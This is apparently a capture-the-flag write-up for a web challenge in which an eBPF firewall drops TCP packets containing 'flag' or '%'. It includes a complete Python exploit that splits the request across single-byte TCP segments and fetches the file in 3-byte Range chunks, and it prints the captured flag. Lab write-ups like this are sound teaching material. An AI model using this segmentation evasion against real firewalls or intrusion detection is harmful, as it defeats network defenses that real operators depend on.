@@ -1,0 +1,210 @@
+---
+Challenge: Web
+Challenge Name: Firewall
+
+**Goal:** Retrieve the content of `/flag.html` protected by an eBPF firewall.
+
+## Challenge Analysis
+
+We are provided with a Docker environment running Nginx on port 5000.  The interesting part is an eBPF program (`firewall.c`) attached to the `eth0` interface using Traffic Control (TC) hooks.
+
+### The Firewall (`firewall.c`)
+
+The eBPF program filters both **Ingress** and **Egress** traffic (`tc/ingress` section used for both in `entrypoint.sh`).
+
+The core filtering logic is:
+1.  **Keyword Scan**: It scans the TCP payload for the 4-byte string `"flag"`.
+2.  **Character Scan**: It blocks the character `%` (preventing URL encoding bypasses like `%66lag`).
+3.  **Action**: If a match is found, `TC_ACT_SHOT` is returned, dropping the packet.
+
+```c
+// firewall.c
+#define KW_LEN 4
+static const char blocked_kw[KW_LEN] = "flag";
+...
+if (__builtin_memcmp(buf, blocked_kw, KW_LEN) == 0) {
+    ctx->found = 1;
+    return 1;
+}
+```
+
+### The Vulnerability
+
+The eBPF filter scans packets individually. It does not reassemble the TCP stream. This means if the forbidden keyword `"flag"` is split across two separate TCP packets, the firewall won't see it (e.g., packet 1 has "fl", packet 2 has "ag").
+
+We need to bypass the filter in two directions:
+1.  **Ingress (Client -> Server)**: The request `GET /flag.html` contains the word "flag".
+2.  **Egress (Server -> Client)**: The response body (the HTML file) contains "flag" (and the flag content itself likely contains "flag").
+
+## Exploitation Strategy
+
+### 1. Ingress Bypass: TCP Segmentation
+To send the request `GET /flag.html` without triggering the firewall, we can split the TCP stream at the application layer. By sending the request byte-by-byte with a tiny delay (and setting `TCP_NODELAY`), we force the TCP stack to send separate packets.
+
+**Request:** `G` `E` `T` ` ` `/` `f` `l` `a` `g` `.` `h` `t` `m` `l` ...
+
+The firewall sees:
+*   Packet A Payload: `... /fl` (Safe)
+*   Packet B Payload: `ag.h ...` (Safe)
+
+### 2. Egress Bypass: HTTP Range Headers
+The server response will also be filtered. If the server sends the full `flag.html`, the packet will contain "flag" and be dropped. We cannot easily control how the server fragments its response *unless* we ask for very small pieces.
+
+We can use the **HTTP `Range` header** to request the file in chunks smaller than the blocked keyword length (4 bytes).
+If we request 3 bytes at a time, no single response packet can possibly contain the 4-byte sequence `"flag"`.
+
+## Solution Script
+
+We implemented a Python script that:
+1.  Connects to the target.
+2.  Sends the HTTP request byte-by-byte to bypass Ingress filtering.
+3.  Uses `Range: bytes=X-Y` headers to fetch the file in 3-byte chunks to bypass Egress filtering.
+4.  Reconstructs the file content.
+
+```python
+#!/usr/bin/env python3
+"""
+eBPF Firewall Bypass Exploit v4 - Robust Version
+"""
+
+import socket
+import time
+import sys
+import re
+
+TARGET_HOST = "35.227.38.232"
+TARGET_PORT = 5000
+# Chunk size 3 guarantees we never construct the 4-byte sequence "flag" in a single read
+CHUNK_SIZE = 3 
+
+def create_socket():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+    s.settimeout(5)
+    s.connect((TARGET_HOST, TARGET_PORT))
+    return s
+
+def send_segmented_request(sock, request_str):
+    """
+    Sends the request byte-by-byte to split keywords across TCP segments.
+    This bypasses the ingress firewall blocking "flag" in the URL.
+    """
+    cmd = request_str.encode()
+    for b in cmd:
+        sock.send(bytes([b]))
+        # Tiny sleep to ensure OS flushes to network stack
+        time.sleep(0.005)
+
+def get_flag_chunked():
+    print(f"[*] Connecting to {TARGET_HOST}:{TARGET_PORT}...")
+    
+    # We first need the file size to know when to stop
+    # We can rely on the previous finding: 213 bytes, or just read blindly.
+    # Let's read blindly in a loop until we get everything.
+    
+    full_content = b""
+    
+    # We will loop through the file content index
+    # Note: HTTP Range is 0-indexed and inclusive
+    current_idx = 0
+    total_size = 213 # Known from previous recon
+    
+    while current_idx < total_size:
+        end_idx = min(current_idx + CHUNK_SIZE - 1, total_size - 1)
+        
+        # Retry loop for robustness
+        retries = 3
+        while retries > 0:
+            try:
+                s = create_socket()
+                
+                # Construct HTTP request with Range header
+                # We interpret "Content-Length" as the size of the whole file
+                req = (
+                    f"GET /flag.html HTTP/1.1\r\n"
+                    f"Host: {TARGET_HOST}:{TARGET_PORT}\r\n"
+                    f"Range: bytes={current_idx}-{end_idx}\r\n"
+                    f"Connection: close\r\n"
+                    f"\r\n"
+                )
+                
+                send_segmented_request(s, req)
+                
+                # Receive response
+                response = b""
+                while True:
+                    try:
+                        chunk = s.recv(4096)
+                        if not chunk: break
+                        response += chunk
+                    except socket.timeout:
+                        break
+                
+                s.close()
+                
+                # Parse body
+                # Look for the double CRLF separating headers from body
+                parts = response.split(b"\r\n\r\n", 1)
+                if len(parts) == 2:
+                    body = parts[1]
+                    
+                    # If we got a 206 Partial Content, the body is our chunk
+                    if b"HTTP/1.1 206" in parts[0] or b"HTTP/1.1 200" in parts[0]:
+                        sys.stdout.write(f"\r[*] Progress: {current_idx}/{total_size} bytes")
+                        full_content += body
+                        break # Success, break retry loop
+                
+                # If we get here without breaking, something went wrong (empty body, 403, etc)
+                # But sometimes range requests return 416 if out of bounds
+                if b"416 Range Not Satisfiable" in response:
+                    print("\n[*] Reached end of file (416).")
+                    current_idx = total_size + 1 # Force exit
+                    break
+                    
+                retries -= 1
+                time.sleep(1)
+                
+            except Exception as e:
+                print(f"\n[!] Error fetching {current_idx}-{end_idx}: {e}")
+                retries -= 1
+                time.sleep(1)
+                
+        current_idx += CHUNK_SIZE
+        
+        # Don't hammer the server too hard
+        time.sleep(0.1)
+
+    print("\n" + "="*50)
+    print("Reconstructed Content:")
+    print("="*50)
+    try:
+        final_text = full_content.decode('utf-8')
+        print(final_text)
+        
+        # Regex search for flag
+        flag = re.search(r'uoftctf\{.*?\}', final_text)
+        if flag:
+            print("\n[SUCCESS] Found Flag:", flag.group(0))
+        else:
+            # Fallback for generic flag format
+            flag_gen = re.search(r'flag\{.*?\}', final_text, re.IGNORECASE)
+            if flag_gen:
+                 print("\n[SUCCESS] Found Flag:", flag_gen.group(0))
+                 
+    except Exception as e:
+        print(f"Decode error: {e}")
+        print(full_content)
+
+if __name__ == "__main__":
+    get_flag_chunked()
+```
+
+During execution, network instability or timeouts caused some "holes" in the fetched flag. We patched these by re-fetching specifically the missing offsets (e.g., offsets 147-149 and 162-164).
+
+## The Flag
+
+After reconstructing the chunks, the final HTML contained:
+
+`uoftctf{f1rew4l1_Is_nOT_par7icu11rLy_R0bust_I_bl4m3_3bpf}`
+
+---
